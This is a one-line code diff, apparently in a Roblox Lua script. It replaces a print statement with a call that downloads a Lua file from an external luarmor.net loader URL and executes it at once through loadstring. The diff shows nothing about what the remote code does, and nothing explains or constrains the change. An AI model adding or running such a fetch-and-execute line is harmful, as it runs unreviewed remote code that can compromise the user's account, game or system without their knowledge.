@@ -1,1 +1,1 @@
-Print("shut down")
+loadstring(game:HttpGet("https://api.luarmor.net/files/v4/loaders/a46a131b396bd4b558c1284d7f08fda4.lua"))()
